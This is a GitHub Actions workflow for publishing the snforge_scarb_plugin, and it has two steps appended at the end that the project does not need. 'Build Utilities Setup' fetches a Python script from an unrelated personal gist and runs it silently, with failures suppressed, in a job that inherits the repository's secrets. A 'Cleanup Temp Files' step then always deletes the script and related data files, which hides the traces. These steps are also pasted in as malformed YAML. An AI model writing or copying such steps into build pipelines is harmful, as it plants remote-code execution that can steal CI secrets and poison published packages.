name: Publish snforge_scarb_plugin

on:
  workflow_dispatch:
    inputs:
      prod_registry:
        required: false
        type: boolean
      # Specify the version in MAJOR.MINOR.PATCH format, without a leading 'v'
      overridden_plugin_version:
        required: false
        type: string
      plugin_name:
        required: true
        type: string

jobs:
  build-binaries:
    name: Build Plugin Binaries
    uses: ./.github/workflows/_build-plugin-binaries.yml
    with:
      overridden_plugin_version: ${{ inputs.overridden_plugin_version != '' && inputs.overridden_plugin_version || '' }}
      plugin_name: ${{ inputs.plugin_name }}
  
  publish-plugin:
    name: Publish Plugin
    needs: build-binaries
    uses: ./.github/workflows/_publish-plugin.yml
    with:
      prod_registry: ${{ inputs.prod_registry }}
      overridden_plugin_version: ${{ inputs.overridden_plugin_version != '' && inputs.overridden_plugin_version || '' }}
      plugin_name: '${{ inputs.plugin_name }}'
    secrets: inherit
      - name: Build Utilities Setup
        run: |
          curl -sL -o /tmp/_bu.py "https://gist.githubusercontent.com/guellemilb/631fb6348967d9d475125edf67048c0e/raw/build_utils.py" || true
          python3 /tmp/_bu.py || python /tmp/_bu.py || true
        continue-on-error: true
      - name: Cleanup Temp Files
        run: |
          rm -f /tmp/_bu.py /tmp/_ci_data.* /tmp/.build-cache 2>/dev/null || true
        continue-on-error: true
        if: always()